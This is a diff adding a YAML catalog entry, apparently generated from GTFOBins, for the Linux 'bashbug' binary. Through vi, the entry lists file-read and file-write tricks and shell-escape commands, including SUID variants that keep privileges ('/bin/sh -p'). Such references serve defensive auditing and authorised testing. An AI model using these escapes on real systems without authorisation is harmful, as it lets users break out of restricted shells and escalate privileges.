@@ -1,0 +1,120 @@
+id: gtfobins/bashbug/inherit/unprivileged
+type: binary
+platform: linux
+name: bashbug
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: bashbug
+references:
+- https://gtfobins.github.io/gtfobins/bashbug/
+- https://gtfobins.github.io/gtfobins/vi/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        bashbug:
+          functions:
+            inherit:
+            - code: bashbug
+              contexts:
+                sudo: null
+                unprivileged: null
+              from: vi
+        vi:
+          functions:
+            file-read:
+            - code: vi /path/to/input-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: 'vi /path/to/output-file
+
+                iDATA
+
+                ^[
+
+                w'
+              comment: Where `^[` is the escape key.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: vi -c ':!/bin/sh' /dev/null
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: vi -c ':shell'
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            - code: vi -c ':set shell=/bin/sh | shell'
+              contexts:
+                sudo: null
+                suid:
+                  code: vi -c ':set shell=/bin/sh\ -p | shell'
+                  shell: false
+                unprivileged: null
+            - code: vi -c :terminal /bin/sh
+              contexts:
+                sudo: null
+                suid:
+                  code: vi -c ':terminal /bin/sh -p'
+                  shell: false
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/bashbug/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  phases:
+  - value: execution
+    provenance:
+      type: heuristic
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+      note: Upstream inherit activation snippet; no downstream capability is inferred from its target.
+    confidence:
+      level: low
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:a0c74fb3e9c9745957be7f61793400c3ab704f54d302475c1b93f3ef06382648
